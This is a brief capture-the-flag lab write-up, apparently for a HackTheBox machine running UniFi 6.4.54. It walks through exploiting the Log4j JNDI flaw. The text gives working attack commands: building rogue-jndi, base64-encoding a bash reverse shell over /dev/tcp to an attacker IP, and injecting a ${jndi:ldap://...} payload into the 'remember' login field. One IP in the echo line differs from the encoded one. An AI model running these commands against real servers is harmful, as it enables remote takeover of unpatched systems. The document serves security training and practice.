---
viewing the website on `https://unified.htb:8443/` returned a login page with the version number, `6.4.54`. Googling returned an article that states the Log4j vulnerability with a proof of concept.[https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi]


Following the article, I exploit the `rememberme` value in the login request. I setup rogue-jndi and maven, then create a reverse shell. to then have the server connect back.
`sudo apt install java (Select own java)`
`sudo apt install maven`
````bash
git clone https://github.com/veracode-research/rogue-jndi && cd rogue-jndi && mvn package
````

````bash
echo 'bash -c bash -i >&/dev/tcp/190.10.14.200/4444 0>&1' | base64
````

```bash
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMjAwLzQ0NDQgMD4mMQo=}|{base64,-d}|{bash,-i}" --hostname "10.10.14.200"
```

Capture a login request and change the value for the remember key to the payload and send it to get a shell.
`"${jndi:ldap://10.10.14.200:1389/o=tomcat}"`
